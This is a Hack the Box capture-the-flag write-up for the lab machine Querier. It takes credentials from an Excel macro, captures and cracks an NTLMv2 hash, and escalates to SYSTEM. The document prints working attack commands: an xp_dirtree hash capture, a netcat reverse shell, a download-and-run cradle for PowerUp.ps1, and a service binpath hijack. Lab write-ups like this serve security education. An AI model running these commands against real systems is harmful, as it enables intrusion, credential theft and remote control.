# Overview
Querier is a vulnerable machine from [Hack the Box](https://www.hackthebox.com) that requires some smb enumeration and using SQL server authentication. The foothold is accomplished after logging into SQL Server, dumping a hash, cracking the hash, and using the credentials to get a shell. The privilege escalation is accomplished through enumerating the host for interesting files, and one file has a plain text password stored. There is another path through abusing a service that we have permissions to modify, and can set it to execute a shell. 

## Nmap Scan
sudo nmap -sS -p- `10.10.10.125` -vvv

* 135/tcp  open  msrpc        syn-ack ttl 127
* 139/tcp  open  netbios-ssn  syn-ack ttl 127
* 445/tcp  open  microsoft-ds syn-ack ttl 127
* 1433/tcp open  ms-sql-s     syn-ack ttl 127
* 5985/tcp  open  wsman        syn-ack ttl 127
* 47001/tcp open  winrm        syn-ack ttl 127

## Basic Enumeration
Enumeration the smb shares, we can see there are 4 potential shares for us to look into:
```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Reports         Disk
```

* Looking into the `Reports` smb share, we find a file, `Currency Volume Report.xlsm`.
* We can use something like `Libre Office` to view the file. There is also another tool called `binwalk` to dump out the contents of the file. There is a Visual Basic script in the file:
```vb
Rem Attribute VBA_ModuleType=VBADocumentModule
Option VBASupport 1

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"
 
  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub
```

Looking through the contents of this Macro, the uid is `reporting`, and the Server is `QUERIER`. We also have a password, `PcwTWTHRwryjc$c6`. Impacket has a script, `mssqlclient`, that will allow us to connect to the SQL Server. 

* `impacket-mssqlclient QUERIER/reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth`
    * Since we cannot get a shell with `enable_xp_cmdshell`, we will need to query the data manually.
    * Resource to learn more about enumerating in MS SQL: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server

We can set up `immpacket-smbserver` to dump potential hashes from the machine: 
* `impacket-smbserver -smb2support share ~/Documents/HTB/Querier/share`
* `exec xp_dirtree ‘\\<attack ip>\share’,1,1`

It dumped out a hash for the user `mssql-svc`: 
```
mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:35c6bfe9d6aa1cbd0e6597448cd34712:0101000000000000802f8a773c72da0108fda96a635ab86e000000000100100054006a0063004c004200660045006f000300100054006a0063004c004200660045006f000200100045006d005800770075005700460072000400100045006d0058007700750057004600720007000800802f8a773c72da0106000400020000000800300030000000000000000000000000300000c76febbce075379824374588fb2b171d6615d638f3c7eb4ebbdde1a9f4f961ce0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003200000000000000000000000000
```
This type of hash is a `ntlmv2 hash`. More information on how to capture credentials like this and why it works can be found [here](https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478). 

* We crack the hash with `hashcat`, using module `5600` for ntlmv2, and get: `corporate568`
* Before, we had authenticated as an anonymous user, and how we can re-authenticate back to the server as the service account. 

## Foothold
Now with our credentials, we can see if the service account `MSSQL-SVC` can run the command to enable a command shell: `enable_xp_cmshell`.

* Since this works, we can now get more data, and transfer over a file to get a real shell on the host. 
* Netcat is nice, so we use that, and have it execute a call back to our attacker machine: 
    * `xp_cmdshell powershell -c Invoke-WebRequest "http://10.10.16.2:8000/nc64.exe" -OutFile "C:\Reports\nc64.exe"`
    * `xp_cmdshell C:\Reports\nc64.exe -e cmd.exe 10.10.16.2 4444`

We are now on the machine with netcat, and can access our `user.txt`.

## Local Enumeration
With our shell, we can bring over a script like `PowerUp.ps1`, and run it to check for some easy exploits. You will want to modify the script and add `Invoke-AllChecks` at the end of the script so this will automatically happen after you bring it over: 
* `cmd.exe /c powershell "IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:8000/PowerUp.ps1')"`

This script immediately finds a file with plain text credentials in it:
```powershell
[*] Checking for cached Group Policy Preferences .xml files....

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group
Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
```

## Privilege Escalation
Now that we have the admin password, we should be able to easily use the `psexec` from impacket to sign in and own this box:
* `impacket-psexec 'Administrator:MyUnclesAreMarioAndLuigi!!1!@10.10.10.125'`
* We are `nt authority\system`, and can read `root.txt.`

Another method that was found by `PowerUp.ps1`, is pointing to a service we have permissions to modify: 
```powershell
[*] Checking service permissions...

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
```

We can view more information on this service by running `sc qc UsoSvc`. This shows us we can modify what this executes. We can replace this service to execute `netcat` for us to get a shell back. 
* `sc config UsoSvc binpath=”C:\Reports\nc64.exe -e cmd.exe 10.10.16.2 5555”`
* Then, we have to run `sc stop UsoSvc`, and `sc start UsoSvc`. We have another shell back as `nt authority\system`.
